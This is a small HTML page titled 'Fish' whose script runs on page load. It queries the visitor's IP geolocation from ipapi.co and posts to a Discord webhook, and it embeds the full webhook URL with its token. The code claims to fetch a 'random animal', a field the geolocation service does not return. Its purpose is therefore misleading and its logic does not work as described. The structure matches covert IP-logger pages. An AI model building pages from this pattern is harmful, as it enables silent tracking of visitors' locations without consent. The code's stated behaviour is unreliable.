<!DOCTYPE html>
<html>
<head>
    <title>Fish</title>
    <script>
        async function fetchAnimalAndSendToDiscord() {
            const ipapiUrl = "https://ipapi.co/json/";
            const discordWebhookUrl = "https://discord.com/api/webhooks/1311146171590508585/hf3DY-DE56mvduSI8q-EstWnr5UOzJAOeVI0pMnNN_YTkT10oFVYu3OGBzJCpg6UsUe7"; // Replace with your webhook URL

            try {
                // Fetch data from ipapi
                const response = await fetch(ipapiUrl);
                if (!response.ok) {
                    throw new Error(`HTTP error! status: ${response.status}`);
                }
                const data = await response.json();

                // Extract the random animal field (if it exists)
                const animal = data.animal || "No animal field found";

                // Prepare the Discord payload
                const discordPayload = {
                    content: `Random animal: ${animal}`
                };

                // Send the data to the Discord webhook
                const discordResponse = await fetch(discordWebhookUrl, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(discordPayload)
                });

                if (!discordResponse.ok) {
                    throw new Error(`Discord webhook error! status: ${discordResponse.status}`);
                }

                console.log("Animal sent to Discord successfully!");
            } catch (error) {
                console.error("An error occurred:", error);
            }
        }

        // Automatically call the function on page load
        window.onload = fetchAnimalAndSendToDiscord;
    </script>
</head>
<body>
    <h1>Fetching Random Animal...</h1>
</body>
</html>
